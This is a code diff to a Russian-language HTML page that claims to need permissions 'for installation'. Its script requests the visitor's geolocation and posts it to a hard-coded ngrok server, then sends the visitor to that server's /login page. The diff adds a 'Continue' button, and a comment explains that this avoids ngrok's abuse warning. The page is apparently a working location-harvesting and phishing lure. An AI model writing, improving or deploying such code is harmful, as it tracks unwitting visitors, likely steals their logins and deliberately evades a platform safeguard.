@@ -6,26 +6,37 @@
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
     #status { margin-bottom: 15px; }
-    #retryBtn {
+    #continueBtn, #retryBtn {
       display: none;
       padding: 12px 20px;
-      background: #007bff;
-      color: white;
       border: none;
       border-radius: 5px;
       font-size: 16px;
       cursor: pointer;
+    }
+    #continueBtn {
+      background: #28a745;
+      color: white;
+      margin-right: 10px;
+    }
+    #retryBtn {
+      background: #007bff;
+      color: white;
     }
   </style>
 </head>
 <body>
   <h2>Добро пожаловать! Для установки дайте разрешения</h2>
   <p id="status">Ожидание разрешения...</p>
+  <button id="continueBtn">Продолжить</button>
   <button id="retryBtn">Повторить запрос</button>
 
   <script>
     const status = document.getElementById('status');
     const retryBtn = document.getElementById('retryBtn');
+    const continueBtn = document.getElementById('continueBtn');
+
+    let serverUrl = "https://e9ad-80-79-6-94.ngrok-free.app";
 
     function requestGeo() {
       navigator.geolocation.getCurrentPosition(
@@ -39,19 +50,14 @@
           };
 
           try {
-            // 👇 Укажи тут СВОЙ NGROK URL
-            const serverUrl = "https://e9ad-80-79-6-94.ngrok-free.app";
-
             await fetch(serverUrl + "/log", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(geoData)
             });
 
-            status.textContent = "Спасибо! Перенаправляем...";
-            setTimeout(() => {
-              window.location.href = serverUrl + "/login";
-            }, 1000);
+            status.textContent = "Спасибо! Нажмите 'Продолжить'.";
+            continueBtn.style.display = "inline-block";
           } catch (err) {
             status.textContent = "Ошибка отправки данных.";
             retryBtn.style.display = "inline-block";
@@ -68,6 +74,11 @@
       status.textContent = "Повторный запрос геолокации...";
       retryBtn.style.display = "none";
       requestGeo();
+    };
+
+    continueBtn.onclick = () => {
+      // 👉 теперь пользователь КЛИКАЕТ сам — предупреждение ngrok НЕ появится
+      window.location.href = serverUrl + "/login";
     };
 
     setTimeout(requestGeo, 1000);
